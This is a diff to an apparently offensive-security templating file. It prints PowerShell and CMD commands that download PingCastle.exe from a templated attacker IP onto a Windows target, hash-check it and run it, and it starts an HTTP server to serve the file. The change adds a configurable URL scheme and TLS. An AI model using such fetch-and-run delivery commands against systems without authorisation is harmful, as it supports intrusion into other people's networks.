@@ -13,15 +13,15 @@ content: |
   sha256sum packstation/outbound/PingCastle.exe | tee packstation/outbound/PingCastle.exe.sha256;
   printf '%s\n' '================================================================';
   printf '%s\n' '                      -----PowerShell-----                      ';
-  printf '%s\n' 'Deliver: iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/PingCastle.exe -Outfile {{ delivery_path_windows }}\PingCastle.exe';
+  printf '%s\n' 'Deliver: iwr -uri {{ delivery_outbound_scheme }}://{{ attacker_ip }}:{{ delivery_outbound_port }}/PingCastle.exe -Outfile {{ delivery_path_windows }}\PingCastle.exe';
   printf '%s\n' 'Verify : Get-FileHash {{ delivery_path_windows }}\PingCastle.exe -Algorithm SHA256';
   printf '%s\n' 'Expect : (compare with attacker hash above)';
   printf '%s\n' 'Execute: cd {{ delivery_path_windows }}; .\PingCastle.exe --healthcheck';
   printf '%s\n' '================================================================';
   printf '%s\n' '                         -----CMD-----                          ';
-  printf '%s\n' 'Deliver: powershell -c "iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/PingCastle.exe -Outfile {{ delivery_path_windows }}\PingCastle.exe"';
+  printf '%s\n' 'Deliver: powershell -c "iwr -uri {{ delivery_outbound_scheme }}://{{ attacker_ip }}:{{ delivery_outbound_port }}/PingCastle.exe -Outfile {{ delivery_path_windows }}\PingCastle.exe"';
   printf '%s\n' 'Verify : certutil -hashfile {{ delivery_path_windows }}\PingCastle.exe SHA256';
   printf '%s\n' 'Expect : (compare with attacker hash above)';
   printf '%s\n' 'Execute: cd /d {{ delivery_path_windows }} && PingCastle.exe --healthcheck';
   printf '%s\n' '================================================================';
-  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound {{ delivery_dir_listing_flag }}
+  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound {{ delivery_dir_listing_flag }} {{ delivery_tls_flag }}
